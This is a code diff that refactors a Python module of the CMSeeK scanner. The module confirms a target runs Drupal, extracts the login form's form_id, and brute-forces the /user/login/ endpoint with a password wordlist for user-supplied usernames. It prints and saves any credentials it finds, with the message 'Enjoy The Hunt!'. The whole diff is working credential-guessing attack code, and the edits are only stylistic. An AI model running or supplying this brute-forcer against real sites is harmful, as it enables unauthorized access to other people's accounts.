@@ -22,11 +22,11 @@ import cmseekdb.generator as generator
 def testlogin(url,user,passw,formid):
 
     if url.endswith('/'):
-        loginUrl = url + 'user/login/'
-        redirect = url + 'user/1/'
+        loginUrl = f'{url}user/login/'
+        redirect = f'{url}user/1/'
     else:
-        loginUrl = url + '/user/login/'
-        redirect = url + '/user/1/'
+        loginUrl = f'{url}/user/login/'
+        redirect = f'{url}/user/1/'
 
     post = { 'name': user, 'pass': passw, 'form_id': formid, 'op': 'Log in', 'location': redirect }
     session = requests.Session()
@@ -57,16 +57,15 @@ def start():
                 drucnf = '1'
             else:
                 try3 = header.check(bsrc[2]) # Headers Check!
-                if try3[0] == '1' and try3[1] == 'dru':
-                    drucnf = '1'
-                else:
-                    drucnf = '0'
+                drucnf = '1' if try3[0] == '1' and try3[1] == 'dru' else '0'
     if drucnf != '1':
         cmseek.error('Could not confirm Drupal... CMSeek is quitting')
         cmseek.handle_quit()
     else:
         cmseek.success("Drupal Confirmed... Checking for Drupal login form")
-        druloginsrc = cmseek.getsource(url + '/user/login/', cmseek.randomua('therelivedaguynamedkakashi'))
+        druloginsrc = cmseek.getsource(
+            f'{url}/user/login/', cmseek.randomua('therelivedaguynamedkakashi')
+        )
         if druloginsrc[0] == '1' and '<form' in druloginsrc[1] and 'name="form_id" value="' in druloginsrc[1]:
             cmseek.success("Login form found! Retriving form id value")
             fid = re.findall(r'name="form_id" value="(.*?)"', druloginsrc[1])
@@ -74,40 +73,36 @@ def start():
                 cmseek.error("Could not find form_id, CMSeeK is quitting!")
                 cmseek.handle_quit()
             else:
-                cmseek.success('form_id found: ' + cmseek.bold + fid[0] + cmseek.cln)
+                cmseek.success(f'form_id found: {cmseek.bold}{fid[0]}{cmseek.cln}')
                 form_id = fid[0]
             druparamuser = ['']
             rawuser = input("[~] Enter Usernames with coma as separation without any space (example: cris,harry): ").split(',')
-            for rusr in rawuser:
-                druparamuser.append(rusr)
+            druparamuser.extend(iter(rawuser))
             drubruteusers = set(druparamuser) ## Strip duplicate usernames
 
             for user in drubruteusers:
                 if user != '':
                     print('\n')
-                    cmseek.info("Bruteforcing User: " + cmseek.bold + user + cmseek.cln)
+                    cmseek.info(f"Bruteforcing User: {cmseek.bold}{user}{cmseek.cln}")
                     pwd_file = open("wordlist/passwords.txt", "r")
                     passwords = pwd_file.read().split('\n')
                     passwords.insert(0, user)
                     passfound = '0'
                     for password in passwords:
-                        if password != '' and password != '\n':
+                        if password not in ['', '\n']:
                             sys.stdout.write('[*] Testing Password: ')
                             sys.stdout.write('%s\r\r' % password)
                             sys.stdout.flush()
                             cursrc = testlogin(url, user, password, form_id)
-                            # print(cursrc)
                             if '/user/login/' in str(cursrc):
                                 continue
-                            else:
-                                cmseek.success('Password found! \n\n\n')
-                                # print (cursrc)
-                                cmseek.success('Password found!')
-                                print(" |\n |--[username]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[password]--> " + cmseek.bold + password + cmseek.cln + "\n |")
-                                cmseek.success('Enjoy The Hunt!')
-                                cmseek.savebrute(url,url + '/user/login',user,password)
-                                passfound = '1'
-                                break
+                            cmseek.success('Password found! \n\n\n')
+                            # print (cursrc)
+                            cmseek.success('Password found!')
+                            print(" |\n |--[username]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[password]--> " + cmseek.bold + password + cmseek.cln + "\n |")
+                            cmseek.success('Enjoy The Hunt!')
+                            cmseek.savebrute(url, f'{url}/user/login', user, password)
+                            passfound = '1'
                             break
                     if passfound == '0':
                         cmseek.error('\n\nCould Not find Password!')
